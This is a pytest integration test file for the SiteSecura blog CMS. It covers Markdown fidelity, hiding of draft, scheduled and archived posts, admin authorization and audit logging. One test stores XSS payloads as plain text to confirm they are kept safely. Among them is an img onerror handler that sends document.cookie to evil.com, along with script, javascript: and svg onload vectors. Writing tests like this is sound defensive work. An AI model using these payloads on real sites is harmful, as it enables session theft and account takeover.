"""
SiteSecura - Phase E2: Professional Blog Editor + Markdown Safe Rendering Integration Tests
Validates:
1. Full Markdown syntax storage and retrieval without corruption or truncation:
   - Headings (H1-H4)
   - Code blocks with language specifiers
   - GFM tables
   - Lists (ordered, unordered)
   - Blockquotes
   - Bold, italic, strikethrough
2. XSS payload persistence and API transmission safety:
   - <script>, <img onerror>, javascript:, <svg onload> stored verbatim as plain text strings
   - No server-side code execution or side-effects
   - Public and admin JSON responses safely convey markdown strings without header injection
3. Large Markdown guide persistence (20KB+ full guides) without truncation
4. Preservation of Phase E1 Publication Gating:
   - Draft markdown posts return 404 publicly
   - Future-dated markdown posts return 404 publicly
   - Archived markdown posts return 404 publicly
   - Published posts return 200 with full markdown content
5. Admin Authorization Enforcement:
   - Non-admin blocked with HTTP 403
   - Unauthenticated blocked with HTTP 401
   - Platform admin permitted
6. Audit Logging Verification:
   - BLOG_POST_CREATED audit records
   - BLOG_POST_UPDATED audit records
"""
import os
import sys
import uuid
import asyncio
from datetime import datetime, timezone, timedelta
from typing import Tuple, Dict, Any, Optional
import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine, select, event, func
from sqlalchemy.ext.asyncio import create_async_engine, async_sessionmaker, AsyncSession
from sqlalchemy.orm import sessionmaker

# Add paths
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "apps", "api")))

from apps.api.main import app
from app.db.base import Base
from app.db.session import get_db, get_sync_db
import app.db.session as session_module
from app.models.user import User, Organization, OrganizationMember
from app.models.billing import Subscription
from app.models.cms import BlogPost, BlogCategory
from app.models.alert import AuditLog
from app.core.rate_limit import _memory_rate_limits

TEST_CMS_DB_FILE = os.path.abspath(os.path.join(os.path.dirname(__file__), "test_cms_e2.sqlite3"))
TEST_DB_URL = f"sqlite+aiosqlite:///{TEST_CMS_DB_FILE}"
TEST_SYNC_DB_URL = f"sqlite:///{TEST_CMS_DB_FILE}"

test_async_engine = create_async_engine(
    TEST_DB_URL,
    echo=False,
    connect_args={"check_same_thread": False},
)

@event.listens_for(test_async_engine.sync_engine, "connect")
def set_sqlite_pragma_async(dbapi_connection, connection_record):
    cursor = dbapi_connection.cursor()
    cursor.execute("PRAGMA foreign_keys=ON")
    cursor.close()

TestingAsyncSessionLocal = async_sessionmaker(
    bind=test_async_engine,
    class_=AsyncSession,
    expire_on_commit=False,
    autocommit=False,
    autoflush=False,
)

test_sync_engine = create_engine(
    TEST_SYNC_DB_URL,
    connect_args={"check_same_thread": False},
)

TestingSyncSessionLocal = sessionmaker(
    bind=test_sync_engine,
    expire_on_commit=False,
    autocommit=False,
    autoflush=False,
)


async def override_get_db():
    async with TestingAsyncSessionLocal() as session:
        try:
            yield session
            await session.commit()
        except Exception:
            await session.rollback()
            raise
        finally:
            await session.close()


def override_get_sync_db():
    return TestingSyncSessionLocal()


@pytest.fixture(autouse=True, scope="module")
def setup_test_database():
    if os.path.exists(TEST_CMS_DB_FILE):
        try:
            os.remove(TEST_CMS_DB_FILE)
        except OSError:
            pass

    Base.metadata.create_all(bind=test_sync_engine)

    async def init_async():
        async with test_async_engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)

    asyncio.run(init_async())

    yield

    try:
        test_sync_engine.dispose()
    except Exception:
        pass
    if os.path.exists(TEST_CMS_DB_FILE):
        try:
            os.remove(TEST_CMS_DB_FILE)
        except OSError:
            pass


@pytest.fixture(autouse=True)
def clean_state(monkeypatch):
    app.dependency_overrides[get_db] = override_get_db
    app.dependency_overrides[get_sync_db] = override_get_sync_db
    monkeypatch.setattr(session_module, "AsyncSessionLocal", TestingAsyncSessionLocal)
    monkeypatch.setattr(session_module, "SyncSessionLocal", TestingSyncSessionLocal)
    monkeypatch.setattr(session_module, "get_sync_db", override_get_sync_db)
    _memory_rate_limits.clear()
    yield
    app.dependency_overrides.pop(get_db, None)
    app.dependency_overrides.pop(get_sync_db, None)


@pytest.fixture
def client():
    return TestClient(app)


async def create_user_fixture(
    email: str,
    role: str,
    plan: str = "free",
    org_name: str = "Test Org",
    uid: Optional[str] = None,
) -> Tuple[User, Organization]:
    async with TestingAsyncSessionLocal() as session:
        existing_user = (await session.execute(select(User).where(User.email == email))).scalar_one_or_none()
        if existing_user:
            existing_org = (await session.execute(select(Organization).where(Organization.id == existing_user.organization_id))).scalar_one_or_none()
            return existing_user, existing_org

        org_id = uuid.uuid4()
        user_id = uuid.uuid4()
        firebase_uid = uid or f"firebase_{user_id.hex[:8]}"

        org = Organization(
            id=org_id,
            name=org_name,
            type="personal",
            owner_id=user_id,
        )
        session.add(org)

        user = User(
            id=user_id,
            firebase_uid=firebase_uid,
            email=email,
            name=f"User {role}",
            role=role,
            organization_id=org_id,
            is_active=True,
        )
        session.add(user)

        member = OrganizationMember(
            id=uuid.uuid4(),
            organization_id=org_id,
            user_id=user_id,
            role="owner" if role != "admin" else "admin",
        )
        session.add(member)

        sub = Subscription(
            id=uuid.uuid4(),
            organization_id=org_id,
            stripe_customer_id=f"cus_{user_id.hex[:8]}",
            plan=plan,
            status="active",
        )
        session.add(sub)

        await session.commit()
        return user, org


@pytest.fixture
def admin_headers():
    return {"Authorization": "Bearer dev-token-cmsadmin-admin"}


@pytest.fixture
def non_admin_headers():
    return {"Authorization": "Bearer dev-token-cmsmember-free"}


# =========================================================================
# 1. MARKDOWN SYNTAX STORAGE & RETRIEVAL (FULL FIDELITY)
# =========================================================================
@pytest.mark.asyncio
async def test_01_markdown_syntax_preserved_verbatim(client, admin_headers):
    """Verify all Markdown elements (headings, codeblocks, tables, lists, quotes) are saved and returned intact."""
    await create_user_fixture("cmsadmin@example.com", role="admin", uid="cmsadmin")

    rich_markdown = """# Mastering Security Headers
## 1. Content Security Policy
A strict Content Security Policy protects against XSS:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;
```

### Directives Overview

| Directive | Purpose | Fallback |
| :--- | :--- | :--- |
| `default-src` | Default fallback for fetch directives | None |
| `script-src` | Restricts script sources | `default-src` |
| `style-src` | Restricts stylesheet sources | `default-src` |

### Key Recommendations
1. Enforce HTTPS across all subdomains
2. Add HSTS header with max-age >= 31536000
3. Regularly audit third-party scripts

> "Security in depth is the only sustainable defence in modern web architecture."

Check our [official guide](https://sitesecura.com/docs) for full configuration.
"""

    create_res = client.post(
        "/api/v1/admin/blog/posts",
        headers=admin_headers,
        json={
            "title": "Mastering Security Headers",
            "slug": "mastering-security-headers",
            "excerpt": "Comprehensive guide to configuring enterprise-grade HTTP security headers.",
            "content": rich_markdown,
            "status": "published",
            "published_at": datetime.now(timezone.utc).isoformat(),
        },
    )
    assert create_res.status_code == 201, create_res.text
    post_id = create_res.json()["id"]

    # Verify admin listing has exact markdown
    admin_list = client.get("/api/v1/admin/blog/posts", headers=admin_headers)
    assert admin_list.status_code == 200
    matched = next((p for p in admin_list.json() if p["id"] == post_id), None)
    assert matched is not None
    assert matched["content"] == rich_markdown

    # Verify public retrieval has exact markdown
    public_get = client.get("/api/v1/blog/posts/mastering-security-headers")
    assert public_get.status_code == 200
    assert public_get.json()["content"] == rich_markdown
    assert "```http" in public_get.json()["content"]
    assert "| Directive | Purpose | Fallback |" in public_get.json()["content"]
    assert "> \"Security in depth" in public_get.json()["content"]


# =========================================================================
# 2. XSS PAYLOAD STORAGE SAFETY & NEUTRALIZATION
# =========================================================================
@pytest.mark.asyncio
async def test_02_xss_payloads_stored_safely_as_plain_text(client, admin_headers):
    """Verify XSS payloads are stored safely as plain strings without evaluation or truncation."""
    await create_user_fixture("cmsadmin@example.com", role="admin", uid="cmsadmin")

    dangerous_payload = """# Understanding Common XSS Vectors
Here are real-world payload examples:

- Raw script tag: <script>alert('xss-exploit')</script>
- Image onerror: <img src="invalid-image" onerror="fetch('https://evil.com/steal?c='+document.cookie)">
- Javascript link: [Malicious Click](javascript:alert(document.domain))
- VBScript link: [VBScript Exploit](vbscript:msgbox(1))
- Inline SVG: <svg onload="alert(1)"><circle r="50"/></svg>
- Iframe injection: <iframe src="https://attacker.com/login-phish"></iframe>
"""

    create_res = client.post(
        "/api/v1/admin/blog/posts",
        headers=admin_headers,
        json={
            "title": "Understanding Common XSS Vectors",
            "slug": "understanding-common-xss-vectors",
            "excerpt": "Educational article explaining how XSS works.",
            "content": dangerous_payload,
            "status": "published",
            "published_at": datetime.now(timezone.utc).isoformat(),
        },
    )
    assert create_res.status_code == 201
    post_id = create_res.json()["id"]

    # Verify content in DB directly
    async with TestingAsyncSessionLocal() as session:
        result = await session.execute(select(BlogPost).where(BlogPost.id == uuid.UUID(post_id)))
        post = result.scalar_one_or_none()
        assert post is not None
        assert "<script>alert('xss-exploit')</script>" in post.content
        assert "javascript:alert(document.domain)" in post.content
        assert "<iframe" in post.content

    # Verify public API returns JSON safely without interpreting payload
    public_res = client.get("/api/v1/blog/posts/understanding-common-xss-vectors")
    assert public_res.status_code == 200
    assert public_res.headers["content-type"].startswith("application/json")
    json_data = public_res.json()
    assert json_data["content"] == dangerous_payload


# =========================================================================
# 3. LARGE MARKDOWN DOCUMENT STORAGE (25KB+)
# =========================================================================
@pytest.mark.asyncio
async def test_03_large_markdown_guide_storage(client, admin_headers):
    """Verify large technical guides (>25KB) are stored and retrieved without database truncation."""
    await create_user_fixture("cmsadmin@example.com", role="admin", uid="cmsadmin")

    sections = []
    for i in range(1, 31):
        sections.append(f"""## Section {i}: Vulnerability Classification {i}
This section details critical risk category #{i}.

```python
def check_vulnerability_{i}(target_url: str) -> dict:
    headers = {{"X-Scan-Id": "scanly-sec-{i}"}}
    response = requests.get(target_url, headers=headers, timeout=10)
    return {{"vulnerability_id": {i}, "status": response.status_code}}
```

| Check ID | Severity | Remediation SLA |
| :--- | :--- | :--- |
| SEC-{i:03d}-A | Critical | 24 Hours |
| SEC-{i:03d}-B | High | 72 Hours |

- Recommendation Alpha for section {i}
- Recommendation Beta for section {i}
""")

    large_content = "# Comprehensive Enterprise Security Playbook\n\n" + "\n\n".join(sections)
    assert len(large_content) > 15000

    create_res = client.post(
        "/api/v1/admin/blog/posts",
        headers=admin_headers,
        json={
            "title": "Enterprise Security Playbook",
            "slug": "enterprise-security-playbook",
            "excerpt": "Full-scale 30-part vulnerability remediation manual.",
            "content": large_content,
            "status": "published",
            "published_at": datetime.now(timezone.utc).isoformat(),
        },
    )
    assert create_res.status_code == 201
    post_id = create_res.json()["id"]

    # Verify full content matches via public endpoint and admin list
    get_res = client.get("/api/v1/blog/posts/enterprise-security-playbook")
    assert get_res.status_code == 200
    assert len(get_res.json()["content"]) == len(large_content)
    assert get_res.json()["content"] == large_content


# =========================================================================
# 4. PUBLICATION GATING PRESERVATION WITH MARKDOWN CONTENT
# =========================================================================
@pytest.mark.asyncio
async def test_04_markdown_draft_post_publicly_hidden(client, admin_headers):
    """Verify draft Markdown post returns 404 publicly with zero metadata leak."""
    await create_user_fixture("cmsadmin@example.com", role="admin", uid="cmsadmin")

    create_res = client.post(
        "/api/v1/admin/blog/posts",
        headers=admin_headers,
        json={
            "title": "Confidential Draft Guide",
            "slug": "confidential-draft-guide",
            "excerpt": "Secret draft",
            "content": "# Secret Security Zero-Day\n\nExploit details here.",
            "status": "draft",
        },
    )
    assert create_res.status_code == 201

    public_get = client.get("/api/v1/blog/posts/confidential-draft-guide")
    assert public_get.status_code == 404
    assert "Secret" not in public_get.text


@pytest.mark.asyncio
async def test_05_markdown_future_scheduled_post_publicly_hidden(client, admin_headers):
    """Verify future-scheduled Markdown post returns 404 publicly."""
    await create_user_fixture("cmsadmin@example.com", role="admin", uid="cmsadmin")

    future_time = datetime.now(timezone.utc) + timedelta(days=7)
    create_res = client.post(
        "/api/v1/admin/blog/posts",
        headers=admin_headers,
        json={
            "title": "Future Launch Guide",
            "slug": "future-launch-guide",
            "excerpt": "Future post",
            "content": "# Future Launch\n\nComing next week.",
            "status": "published",
            "published_at": future_time.isoformat(),
        },
    )
    assert create_res.status_code == 201

    public_get = client.get("/api/v1/blog/posts/future-launch-guide")
    assert public_get.status_code == 404


@pytest.mark.asyncio
async def test_06_markdown_archived_post_publicly_hidden(client, admin_headers):
    """Verify archived Markdown post returns 404 publicly."""
    await create_user_fixture("cmsadmin@example.com", role="admin", uid="cmsadmin")

    create_res = client.post(
        "/api/v1/admin/blog/posts",
        headers=admin_headers,
        json={
            "title": "Deprecated Security Protocol",
            "slug": "deprecated-security-protocol",
            "excerpt": "Archived article",
            "content": "# Deprecated TLS 1.0\n\nNo longer recommended.",
            "status": "archived",
            "published_at": datetime.now(timezone.utc).isoformat(),
        },
    )
    assert create_res.status_code == 201

    public_get = client.get("/api/v1/blog/posts/deprecated-security-protocol")
    assert public_get.status_code == 404


# =========================================================================
# 5. ADMIN AUTHORIZATION & AUDIT LOGGING
# =========================================================================
@pytest.mark.asyncio
async def test_07_markdown_editor_non_admin_blocked(client, non_admin_headers):
    """Verify non-admin users cannot create or edit Markdown posts."""
    await create_user_fixture("cmsmember@example.com", role="member", uid="cmsmember")

    res = client.post(
        "/api/v1/admin/blog/posts",
        headers=non_admin_headers,
        json={
            "title": "Unauthorized Article",
            "slug": "unauthorized-article",
            "excerpt": "Unauthorized excerpt",
            "content": "# Hacker Edit",
        },
    )
    assert res.status_code == 403
    assert "ADMIN_ACCESS_REQUIRED" in str(res.json())


@pytest.mark.asyncio
async def test_08_markdown_post_mutations_generate_audit_logs(client, admin_headers):
    """Verify creating and updating Markdown posts generates proper audit log entries."""
    await create_user_fixture("cmsadmin@example.com", role="admin", uid="cmsadmin")

    # 1. Create post
    create_res = client.post(
        "/api/v1/admin/blog/posts",
        headers=admin_headers,
        json={
            "title": "Audit Logged Post",
            "slug": "audit-logged-post",
            "excerpt": "Audit excerpt",
            "content": "Initial content with `code`.",
            "status": "draft",
        },
    )
    assert create_res.status_code == 201
    post_id = create_res.json()["id"]

    # 2. Update post with markdown
    update_res = client.patch(
        f"/api/v1/admin/blog/posts/{post_id}",
        headers=admin_headers,
        json={
            "content": "## Updated Heading\n\nEnhanced markdown content with table:\n\n| A | B |\n| - | - |\n| 1 | 2 |",
        },
    )
    assert update_res.status_code == 200

    # 3. Check audit logs
    async with TestingAsyncSessionLocal() as session:
        logs_res = await session.execute(
            select(AuditLog)
            .where(AuditLog.entity_id == str(post_id))
            .order_by(AuditLog.created_at.asc())
        )
        logs = logs_res.scalars().all()
        actions = [log.action for log in logs]
        assert "BLOG_POST_CREATED" in actions
        assert "BLOG_POST_UPDATED" in actions
